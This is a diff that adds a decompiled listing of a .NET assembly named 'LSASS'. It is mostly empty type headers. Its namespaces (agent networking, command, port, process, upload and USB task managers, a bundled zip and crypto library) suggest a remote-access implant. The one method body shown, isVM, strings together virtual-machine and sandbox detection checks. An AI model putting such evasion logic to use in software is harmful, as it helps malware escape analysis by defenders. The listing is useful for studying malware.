@@ -1,0 +1,407 @@
+
+// ===== type <Module> =====
+
+// ===== type LSASS.Services =====
+
+// ===== type LSASS.Program =====
+
+// ===== type LSASS.Properties.Settings =====
+
+// ===== type LSASS.Networking.Agent =====
+
+// ===== type LSASS.Networking.DomainController =====
+
+// ===== type LSASS.Networking.MyWebClient =====
+
+// ===== type LSASS.Models.Task =====
+
+// ===== type LSASS.Models.Enviornment =====
+
+.method isVM  // rva=0x2a34
+    // code size 73 bytes, maxstack 1, 32 instructions
+    000C  ldc.i4.0     
+    000D  stloc.0      
+    000E  ldarg.0      
+    000F  initobj      LSASS.Models.VirtualMachine
+    0015  ldarg.0      
+    0016  call         MethodDefRow LSASS.Models.Enviornment::DetectVM
+    001B  brtrue.s     3201
+    001D  ldarg.0      
+    001E  call         MethodDefRow LSASS.Models.Enviornment::DetectVM2
+    0023  brtrue.s     3201
+    0025  ldarg.0      
+    0026  call         MethodDefRow LSASS.Models.Enviornment::DetectVM3
+    002B  brtrue.s     3201
+    002D  ldarg.0      
+    002E  call         MethodDefRow LSASS.Models.Enviornment::GetProcessorID
+    0033  brtrue.s     3201
+    0035  ldarg.0      
+    0036  call         MethodDefRow LSASS.Models.Enviornment::CoreCount
+    003B  brtrue.s     3201
+    003D  ldarg.0      
+    003E  call         MethodDefRow LSASS.Models.Enviornment::CpuTemp
+    0043  brtrue.s     3201
+    0045  ldarg.0      
+    0046  call         MethodDefRow LSASS.Models.Enviornment::MatchMacAdd
+    004B  brfalse.s    3205
+    004D  ldc.i4.1     
+    004E  stloc.0      
+    004F  br.s         3207
+    0051  ldc.i4.0     
+    0052  stloc.0      
+    0053  ldloc.0      
+    0054  ret          
+
+// ===== type LSASS.Models.FileInformation =====
+
+// ===== type LSASS.Models.Identification =====
+
+// ===== type LSASS.Models.VirtualMachine =====
+
+// ===== type LSASS.IO.Helper.FileHelper =====
+
+// ===== type LSASS.IO.Core.Crypto =====
+
+// ===== type LSASS.IO.Core.eFile =====
+
+// ===== type LSASS.IO.ISharp.Zip.SharpZipBaseException =====
+
+// ===== type LSASS.IO.ISharp.Zip.FastZipEvents =====
+
+// ===== type LSASS.IO.ISharp.Zip.FastZip =====
+
+// ===== type LSASS.IO.ISharp.Zip.IEntryFactory =====
+
+// ===== type LSASS.IO.ISharp.Zip.WindowsNameTransform =====
+
+// ===== type LSASS.IO.ISharp.Zip.UseZip64 =====
+
+// ===== type LSASS.IO.ISharp.Zip.CompressionMethod =====
+
+// ===== type LSASS.IO.ISharp.Zip.EncryptionAlgorithm =====
+
+// ===== type LSASS.IO.ISharp.Zip.GeneralBitFlags =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipConstants =====
+
+// ===== type LSASS.IO.ISharp.Zip.HostSystemID =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipEntry =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipEntryFactory =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipException =====
+
+// ===== type LSASS.IO.ISharp.Zip.ITaggedData =====
+
+// ===== type LSASS.IO.ISharp.Zip.RawTaggedData =====
+
+// ===== type LSASS.IO.ISharp.Zip.ExtendedUnixData =====
+
+// ===== type LSASS.IO.ISharp.Zip.NTTaggedData =====
+
+// ===== type LSASS.IO.ISharp.Zip.ITaggedDataFactory =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipExtraData =====
+
+// ===== type LSASS.IO.ISharp.Zip.KeysRequiredEventArgs =====
+
+// ===== type LSASS.IO.ISharp.Zip.TestStrategy =====
+
+// ===== type LSASS.IO.ISharp.Zip.TestOperation =====
+
+// ===== type LSASS.IO.ISharp.Zip.TestStatus =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipTestResultHandler =====
+
+// ===== type LSASS.IO.ISharp.Zip.FileUpdateMode =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipFile =====
+
+// ===== type LSASS.IO.ISharp.Zip.IStaticDataSource =====
+
+// ===== type LSASS.IO.ISharp.Zip.IDynamicDataSource =====
+
+// ===== type LSASS.IO.ISharp.Zip.StaticDiskDataSource =====
+
+// ===== type LSASS.IO.ISharp.Zip.DynamicDiskDataSource =====
+
+// ===== type LSASS.IO.ISharp.Zip.IArchiveStorage =====
+
+// ===== type LSASS.IO.ISharp.Zip.BaseArchiveStorage =====
+
+// ===== type LSASS.IO.ISharp.Zip.DiskArchiveStorage =====
+
+// ===== type LSASS.IO.ISharp.Zip.MemoryArchiveStorage =====
+
+// ===== type LSASS.IO.ISharp.Zip.DescriptorData =====
+
+// ===== type LSASS.IO.ISharp.Zip.EntryPatchData =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipHelperStream =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipInputStream =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipNameTransform =====
+
+// ===== type LSASS.IO.ISharp.Zip.ZipOutputStream =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Deflater =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.DeflaterConstants =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.DeflateStrategy =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.DeflaterEngine =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.DeflaterHuffman =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.DeflaterPending =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Inflater =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.InflaterDynHeader =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.InflaterHuffmanTree =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.PendingBuffer =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Streams.DeflaterOutputStream =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Streams.InflaterInputBuffer =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Streams.InflaterInputStream =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Streams.OutputWindow =====
+
+// ===== type LSASS.IO.ISharp.Zip.Compression.Streams.StreamManipulator =====
+
+// ===== type LSASS.IO.ISharp.Encryption.PkzipClassic =====
+
+// ===== type LSASS.IO.ISharp.Encryption.PkzipClassicCryptoBase =====
+
+// ===== type LSASS.IO.ISharp.Encryption.PkzipClassicEncryptCryptoTransform =====
+
+// ===== type LSASS.IO.ISharp.Encryption.PkzipClassicDecryptCryptoTransform =====
+
+// ===== type LSASS.IO.ISharp.Encryption.PkzipClassicManaged =====
+
+// ===== type LSASS.IO.ISharp.Encryption.ZipAESStream =====
+
+// ===== type LSASS.IO.ISharp.Encryption.ZipAESTransform =====
+
+// ===== type LSASS.IO.ISharp.Core.ScanEventArgs =====
+
+// ===== type LSASS.IO.ISharp.Core.ProgressEventArgs =====
+
+// ===== type LSASS.IO.ISharp.Core.DirectoryEventArgs =====
+
+// ===== type LSASS.IO.ISharp.Core.ScanFailureEventArgs =====
+
+// ===== type LSASS.IO.ISharp.Core.ProcessDirectoryHandler =====
+
+// ===== type LSASS.IO.ISharp.Core.ProcessFileHandler =====
+
+// ===== type LSASS.IO.ISharp.Core.ProgressHandler =====
+
+// ===== type LSASS.IO.ISharp.Core.CompletedFileHandler =====
+
+// ===== type LSASS.IO.ISharp.Core.DirectoryFailureHandler =====
+
+// ===== type LSASS.IO.ISharp.Core.FileFailureHandler =====
+
+// ===== type LSASS.IO.ISharp.Core.FileSystemScanner =====
+
+// ===== type LSASS.IO.ISharp.Core.INameTransform =====
+
+// ===== type LSASS.IO.ISharp.Core.IScanFilter =====
+
+// ===== type LSASS.IO.ISharp.Core.NameFilter =====
+
+// ===== type LSASS.IO.ISharp.Core.PathFilter =====
+
+// ===== type LSASS.IO.ISharp.Core.ExtendedPathFilter =====
+
+// ===== type LSASS.IO.ISharp.Core.NameAndSizeFilter =====
+
+// ===== type LSASS.IO.ISharp.Core.StreamUtils =====
+
+// ===== type LSASS.IO.ISharp.Core.WindowsPathUtils =====
+
+// ===== type LSASS.IO.ISharp.Checksums.Adler32 =====
+
+// ===== type LSASS.IO.ISharp.Checksums.Crc32 =====
+
+// ===== type LSASS.IO.ISharp.Checksums.IChecksum =====
+
+// ===== type LSASS.IO.ISharp.Checksums.StrangeCRC =====
+
+// ===== type LSASS.IO.IconResources.DeviceIndependentBitmap =====
+
+// ===== type LSASS.IO.IconResources.DirectoryResource`1 =====
+
+// ===== type LSASS.IO.IconResources.Gdi32 =====
+
+// ===== type LSASS.IO.IconResources.IconDirectoryResource =====
+
+// ===== type LSASS.IO.IconResources.IconFile =====
+
+// ===== type LSASS.IO.IconResources.IconFileIcon =====
+
+// ===== type LSASS.IO.IconResources.IconImageResource =====
+
+// ===== type LSASS.IO.IconResources.IconResource =====
+
+// ===== type LSASS.IO.IconResources.Kernel32 =====
+
+// ===== type LSASS.IO.IconResources.Resource =====
+
+// ===== type LSASS.IO.IconResources.ResourceId =====
+
+// ===== type LSASS.IO.IconResources.ResourceInfo =====
+
+// ===== type LSASS.IO.IconResources.ResourceUtil =====
+
+// ===== type LSASS.IO.IconResources.User32 =====
+
+// ===== type LSASS.Core.Manager =====
+
+// ===== type LSASS.Core.Jobs =====
+
+// ===== type LSASS.Core.Tasks.CmdManager =====
+
+// ===== type LSASS.Core.Tasks.PortManager =====
+
+// ===== type LSASS.Core.Tasks.ProcessManager =====
+
+// ===== type LSASS.Core.Tasks.ScanManager =====
+
+// ===== type LSASS.Core.Tasks.ServicesManager =====
+
+// ===== type LSASS.Core.Tasks.UploadManager =====
+
+// ===== type LSASS.Core.Tasks.UsbManager =====
+
+// ===== type LSASS.Common.CommonSettings =====
+
+// ===== type LSASS.Common.Resources =====
+
+// ===== type LSASS.Common.ExceptionLog =====
+
+// ===== type LSASS.Common.JsonHelper =====
+
+// ===== type LSASS.Common.Enums.TaskName =====
+
+// ===== type <PrivateImplementationDetails> =====
+
+// ===== type <>c__DisplayClass3_0 =====
+
+// ===== type <>c__DisplayClass7_0 =====
+
+// ===== type <>c =====
+
+// ===== type <>c =====
+
+// ===== type Overwrite =====
+
+// ===== type ConfirmOverwriteDelegate =====
+
+// ===== type Known =====
+
+// ===== type TimeSetting =====
+
+// ===== type Flags =====
+
+// ===== type KeysRequiredEventHandler =====
+
+// ===== type HeaderTest =====
+
+// ===== type UpdateCommand =====
+
+// ===== type UpdateComparer =====
+
+// ===== type ZipUpdate =====
+
+// ===== type ZipString =====
+
+// ===== type ZipEntryEnumerator =====
+
+// ===== type UncompressedStream =====
+
+// ===== type PartialInputStream =====
+
+// ===== type ReadDataHandler =====
+
+// ===== type Tree =====
+
+// ===== type BitmapCompression =====
+
+// ===== type BITMAPINFOHEADER =====
+
+// ===== type BITMAPINFO =====
+
+// ===== type RGBQUAD =====
+
+// ===== type BITMAPFILEHEADER =====
+
+// ===== type DIBColors =====
+
+// ===== type GroupType =====
+
+// ===== type VAR_HEADER =====
+
+// ===== type GRPICONDIR =====
+
+// ===== type GRPICONDIRENTRY =====
+
+// ===== type FILEGRPICONDIRENTRY =====
+
+// ===== type FILEGRPICONDIR =====
+
+// ===== type ResourceTypes =====
+
+// ===== type EnumResourceTypesDelegate =====
+
+// ===== type EnumResourceNamesDelegate =====
+
+// ===== type EnumResourceLanguagesDelegate =====
+
+// ===== type <GetEnumerator>d__22 =====
+
+// ===== type ICONINFO =====
+
+// ===== type <>c__DisplayClass5_0 =====
+
+// ===== type <>c__DisplayClass5_1 =====
+
+// ===== type <>c =====
+
+// ===== type <>c__DisplayClass6_0 =====
+
+// ===== type <>c =====
+
+// ===== type <>c__DisplayClass5_0 =====
+
+// ===== type <>c =====
+
+// ===== type <>c =====
+
+// ===== type <>c =====
+
+// ===== type <>c =====
+
+// ===== type <>c__DisplayClass0_0 =====
+
+// ===== type __StaticArrayInitTypeSize=12 =====
+
+// ===== type __StaticArrayInitTypeSize=16 =====
+
+// ===== type __StaticArrayInitTypeSize=40 =====
+
+// ===== type __StaticArrayInitTypeSize=76 =====
+
+// ===== type __StaticArrayInitTypeSize=116 =====
+
+// ===== type __StaticArrayInitTypeSize=120 =====
+
+// ===== type __StaticArrayInitTypeSize=1024 =====
